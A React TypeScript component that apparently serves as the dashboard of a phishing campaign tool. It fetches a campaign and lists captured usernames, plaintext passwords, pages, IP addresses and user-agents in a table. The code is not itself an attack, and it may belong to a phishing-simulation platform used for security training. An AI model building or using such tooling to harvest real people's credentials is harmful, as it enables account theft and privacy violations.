import React, { useEffect, useState } from 'react';
import { getCampaign } from '../services/campaignServices';
import { CampaignDB } from '../types/types';
import { useParams } from 'react-router-dom';
import { getUserFromToken } from '../services/authServices';
import MyTitle from './all/Title';


const Campaign: React.FC = () => {
  const [campaign, setCampaign] = useState<CampaignDB|null>();
  const { id } = useParams();

  useEffect(() => {
    const user = getUserFromToken()
        if (!user)
            return
    
    if (id) {
        const fetchCampaign = async () => {
            try {
               const response = await getCampaign({user_id: user.id, campaign_id: id});
               setCampaign(response)
            } 
            catch (err) {
               console.error(err);
            }
            
        };

        fetchCampaign()
    }
  }, []); 

  return (
    <div>
        <MyTitle name={'Campaign'} variant='subheader'/>
        <br></br>
      {campaign && campaign.data && 
          <>
            <h3>{campaign.name}</h3>
            <table>
              <thead>
                <tr>
                <th>Date</th>
                <th>Time</th>
                <th>Username</th>
                <th>Password</th>
                <th>Page</th>
                <th>IP</th>
                <th>User-Agent</th>
                </tr>
              </thead>
              <tbody>
                {campaign.data.map((c, i) => (
                  <tr key={i}>
                    <td>{c.date}</td>
                    <td>{c.time}</td>
                    <td>{c.username}</td>
                    <td>{c.password}</td>
                    <td>{c.page}</td> 
                    <td>{c.ip}</td> 
                    <td>{c.user_agent}</td> 
                  </tr>
                ))}
              </tbody>
            </table>
          </>
        
      }
    { campaign && campaign.data.length === 0 && <p>You have no data</p>}
    </div>
  );
};

export default Campaign;
